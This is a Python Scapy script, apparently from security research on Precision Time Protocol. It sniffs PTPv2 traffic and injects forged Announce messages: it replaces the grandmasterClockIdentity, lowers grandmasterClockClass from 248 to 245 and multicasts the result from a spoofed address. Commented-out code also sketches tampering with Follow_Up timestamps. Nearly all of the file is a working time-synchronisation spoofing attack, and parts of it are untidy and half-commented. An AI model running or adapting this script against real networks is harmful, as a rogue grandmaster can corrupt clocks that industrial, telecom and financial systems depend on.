from scapy.all import *
from scapy.fields import BitEnumField, BitField, ByteField, ConditionalField, FlagsField, \
        LongField, ShortField, SignedByteField, XBitField, XByteField, XIntField, XStrFixedLenField
from scapy.layers.l2 import Ether
from scapy.packet import Packet

from fields import PortIdentityField, TimestampField, ClockIdentityField
from scapy.all import *
#-------------------------------------------#

import random

class IEEE588(Packet):
    name = "PTPv2"

    MSG_TYPES = {
        0x0: "Sync",
        0x2: "PdelayReqest",
        0x3: "PdelayResponse",
        0x8: "FollowUp",
        0xA: "PdelayResponseFollowUp",
        0xb: "Announce" 
    }

    FLAGS = [
        "LI61", "LI59", "UTC_REASONABLE", "TIMESCALE",
        "TIME_TRACEABLE", "FREQUENCY_TRACEABLE", "SYNCHRONIZATION_UNCERTAIN", "?",
        "ALTERNATE_MASTER", "TWO_STEP", "UNICAST", "?",
        "?", "profileSpecific1", "profileSpecific2", "SECURITY",
    ]

    fields_desc = [
        BitField("transportSpecific", 1, 4),
        BitEnumField("messageType", 0, 4, MSG_TYPES),
        XBitField("reserved0", 0, 4),
        BitField("versionPTP", 0x2, 4),
        ShortField("messageLength", 34),
        ByteField("domainNumber", 0),
        XByteField("reserved1", 0),
        FlagsField("flags", 0, 16, FLAGS),
        LongField("correctionField", 0),
        XIntField("reserved2", 0),
        PortIdentityField("sourcePortIdentity", 0),
        ShortField("sequenceId", 0),
        XByteField("control", 0),
        SignedByteField("logMessageInterval", -3),

        
        ConditionalField(TimestampField("preciseOriginTimestamp", 0), lambda pkt: pkt.is_followup),
        ConditionalField(XStrFixedLenField("informationTlv", 0, 32), lambda pkt: pkt.is_followup),
        ConditionalField(XStrFixedLenField("ClockIdentity", 0,64), lambda pkt: pkt.is_followup),

        #
        # ConditionalField(ClockIdentityField("grandmasterClockClass",0),lambda pkt: pkt.is_Announce),

        # PdelayReq
        ConditionalField(BitField("reserved4", 0, 80), lambda pkt: pkt.is_pdelay_req),
        ConditionalField(BitField("reserved5", 0, 80), lambda pkt: pkt.is_pdelay_req),

        # PdelayResp
        ConditionalField(
            TimestampField("requestReceiptTimestamp", 0),
            lambda pkt: pkt.is_pdelay_resp),

        # PdelayRespFollowUp
        ConditionalField(
            TimestampField("responseOriginTimestamp", 0),
            lambda pkt:pkt.is_pdelay_resp_followup),

        ConditionalField(
            PortIdentityField("requestingPortIdentity", 0),
            lambda pkt: pkt.is_pdelay_resp or pkt.is_pdelay_resp_followup),
    ]

    @property
    def is_sync(self):
        return(self.messageType == 0x0)

    @property
    def is_followup(self):# pkts = sniff(filter="udp and (port 319 or port 320)", prn=dissect_and_resend_ptpv2, count=60)
    #pkts = sniff(filter="udp and (port 319 or port 320)", count=60)
        return(self.messageType == 0x8)
    @property
    def is_Announce(self):
        return(self.messageType == 0xb)
    @property
    def is_pdelay_req(self):
        return(self.messageType == 0x2)

    @property
    def is_pdelay_resp(self):
        return(self.messageType == 0x3)

    @property
    def is_pdelay_resp_followup(self):
        return(self.messageType == 0xA)

    def extract_padding(self, s):
        return "", s


packet_count = {"0x0":0,"0x8":0,"0xb":0,"0x1":0,'0x9':0} # 0x0:Sync, 0x8:Follow_up, 0xb:Announce
                                                         # 0x1:Delay_req_msg, 0x9:Delay_resp_msg
saved_packets = dict()



rand_precentage = list()
def dissect_and_resend_ptpv2(packet):

       if 'UDP' in packet and 'IP' in packet and Raw in packet:
            ptp_payload = packet[Raw].load
            ptp_packet = IEEE588(ptp_payload) 

            
            if ptp_packet.messageType == 0x0:
                packet_count['0x0'] +=1
                print("found A Sync message:")
                ptp_packet.sequenceId +=1

                if packet_count['0x0'] == 0:
                    saved_packets['Sync'] = ptp_packet
                else:
                    pass 
       
            elif ptp_packet.messageType == 0x8:
                # packet_count['0x8'] +=1
                # print("found A Follow_Up message:")
                # time_before = ptp_packet.preciseOriginTimestamp
                # precentage_of_packets = random.uniform(0.05,0.15)
                # # fraction = 1 + (packet_count['0x8']*precentage_of_packets)
                # # rand_precentage.append(precentage_of_packets)
            
                # # fraction = 1+ (random.uniform(0.01,0.1))
                # ptp_packet.preciseOriginTimestamp = 100.76
                # ptp_packet.sequenceId +=1
                pass

                if packet_count['0x8'] == 0:
                    # saved_packets['Follow_up'] = ptp_packet
                    pass
                else:
                    pass 


                

            elif ptp_packet.messageType == 0xb:
                packet_count['0xb'] +=1

            elif ptp_packet.messageType == 0x1:
                packet_count['0x1'] +=1
            
            elif ptp_packet.messageType == 0x9:
                packet_count['0x9'] +=1

                                
            print("\nPTPv2 Fields:")
      
            ptp_packet.show()


            #Sending back "sniffed" Sync packets
            if ptp_packet.messageType == 0x0:
                # ptp_packet_sending2 = IP(src=packet['IP'].src, dst=packet['IP'].dst) / \
                #     UDP(sport=319, dport=319) / \
                #         Raw(ptp_packet)
                # print("not sending")
                # send(ptp_packet_sending2, iface="enp1s0")

            # Manipulation of the Announce_msg: Here we change the grandmasterClockClass!
                pass
            elif ptp_packet.messageType == 0xb: 
                print("----------------------------------")
                #print(fraction)
             
                # ptp_packet.show()
                
               
                ptp_packet.source
                ptp_packet.sequenceId +=1
                ptp_packetSend = (bytes(ptp_packet)).rstrip(b'\x00') #\x00\x01 SourcePortID 
                byte_sequence = (ptp_packetSend)
                print(byte_sequence)
                print("-----------------------")
                modified_byte_sequence = byte_sequence.replace(b'\x18\xa9\x05\xff\xfe\xbc\xcel', b'\x64\x31\x50\xff\xfe\x18\x80\x18') #Here we change the grandmasterClockIdentity
                modified_byte_sequence = modified_byte_sequence.replace(b'\xf8', b'\xf5') # This is where we change the grandmasterClockclass value from 248 too 245
                ptp_packet_sending2 = IP(src='192.168.100.101', dst="224.0.1.129") / \
                        UDP(sport=320, dport=320) / \
                            Raw(modified_byte_sequence) 
                print(modified_byte_sequence)
                send(ptp_packet_sending2, iface="enp1s0") 
                #ptp_packetSend.show()
                time.sleep(1.5)
            
                 
#
#

        
            print("----------------------------------")

saved_packets = dict()

while (packet_count["0x0"]== 0 and packet_count["0x8"]== 0):

    pkts = sniff(filter="udp and (port 319 or port 320)", prn=dissect_and_resend_ptpv2)
    
    #pkts = sniff(filter="udp and (port 319 or port 320)", prn=dissect_and_resend_ptpv2, count=60)
    #pkts = sniff(filter="udp and (port 319 or port 320)", count=60)
    

for i in range(10):
    

    for pkt in  range(len(pkts)):
  
        ptp_payload2 = pkts[pkt][Raw].load
        ptp_packet2 = IEEE588(ptp_payload2)
        if ptp_packet2.messageType == 0xb:
            print("--------") 

            

            dissect_and_resend_ptpv2(ptp_packet2)
            # time.sleep(1)
        else:
            pass
    print(f"list of precentages: {rand_precentage}")

   


print(f"Number of packets captured:{packet_count}")
